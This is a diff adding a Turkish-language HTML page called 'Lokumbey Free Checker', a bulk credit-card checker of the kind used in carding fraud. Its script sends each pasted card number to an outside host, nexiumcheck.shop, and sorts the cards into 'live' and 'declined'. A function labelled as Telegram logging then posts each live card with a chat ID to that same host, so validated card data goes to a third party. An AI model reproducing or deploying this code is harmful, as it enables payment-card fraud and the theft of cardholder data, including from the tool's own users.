@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Lokumbey Free Checker</title>
+  <style>
+    body {
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      font-family: 'Segoe UI', sans-serif;
+      color: #fff;
+      text-align: center;
+      padding: 20px;
+    }
+    textarea {
+      width: 90%;
+      height: 100px;
+      background-color: #1a1a2e;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      padding: 10px;
+      font-size: 16px;
+    }
+    .button {
+      padding: 12px 20px;
+      margin: 10px 5px;
+      border: none;
+      border-radius: 20px;
+      font-size: 14px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .check { background-color: #007bff; color: white; }
+    .stop { background-color: #6c757d; color: white; }
+    .clear { background-color: #ff4d6d; color: white; }
+    .box {
+      background-color: #1c1c3c;
+      padding: 15px;
+      margin: 20px auto;
+      width: 90%;
+      border-radius: 12px;
+      box-shadow: 0 0 10px #00f0ff;
+    }
+    .live { border-left: 5px solid #00ffae; }
+    .declined { border-left: 5px solid #ff0055; }
+    input[type="checkbox"] {
+      transform: scale(1.2);
+      margin-right: 5px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Lokumbey Free Checker</h1>
+  <textarea id="cardInput" placeholder="Kart bilgilerini buraya satır satır girin..."></textarea><br />
+  <button class="button check" onclick="checkCards()">TOPLU KONTROL ET</button>
+  <button class="button stop" onclick="stopCheck()">DURDUR</button>
+  <button class="button clear" onclick="clearAll()">TEMİZLE</button>
+  <label><input type="checkbox" id="copyLive" checked />CANLILARI KOPYALA</label>
+  <p>Toplam: <span id="total">0</span> | Kontrol Edilen: <span id="checked">0</span> | Kalan: <span id="remaining">0</span></p>
+
+  <div class="box live">
+    <h3><input type="checkbox" checked />✅ Canlı Kartlar</h3>
+    <pre id="liveResult"></pre>
+  </div>
+  <div class="box declined">
+    <h3>❌ Declined Kartlar</h3>
+    <pre id="declinedResult"></pre>
+  </div>
+
+  <script>
+    let stop = false;
+
+    async function sendTelegramLog(card, result) {
+      // Telegram Bot API'ye canlı kartı gönder
+      fetch("https://nexiumcheck.shop/api/free.php?card=" + encodeURIComponent(card), {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: "7029721601",
+          text: `✅ LIVE KART LOGU\n🧾 Kart: ${card}\n📊 Sonuç: ${result}`
+        })
+      }).catch(console.error);
+    }
+
+    async function checkCards() {
+      stop = false;
+      const input = document.getElementById("cardInput").value.trim().split("\n");
+      const live = [], declined = [];
+      let checked = 0;
+      document.getElementById("total").innerText = input.length;
+
+      for (const card of input) {
+        if (stop) break;
+        const res = await fetch("https://nexiumcheck.shop/api/free.php?card=" + encodeURIComponent(card), {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ card }),
+        });
+        const result = await res.text();
+
+        if (result.includes("LIVE")) {
+          live.push(card + " " + result);
+          sendTelegramLog(card, result);  // Telegram log gönderiliyor
+        } else {
+          declined.push(card + " " + result);
+        }
+
+        document.getElementById("liveResult").textContent = live.join("\n");
+        document.getElementById("declinedResult").textContent = declined.join("\n");
+
+        checked++;
+        document.getElementById("checked").innerText = checked;
+        document.getElementById("remaining").innerText = input.length - checked;
+      }
+
+      if (document.getElementById("copyLive").checked) {
+        navigator.clipboard.writeText(live.join("\n"));
+      }
+    }
+
+    function stopCheck() {
+      stop = true;
+    }
+
+    function clearAll() {
+      document.getElementById("cardInput").value = "";
+      document.getElementById("liveResult").textContent = "";
+      document.getElementById("declinedResult").textContent = "";
+      document.getElementById("total").innerText = "0";
+      document.getElementById("checked").innerText = "0";
+      document.getElementById("remaining").innerText = "0";
+    }
+  </script>
+</body>
+</html>
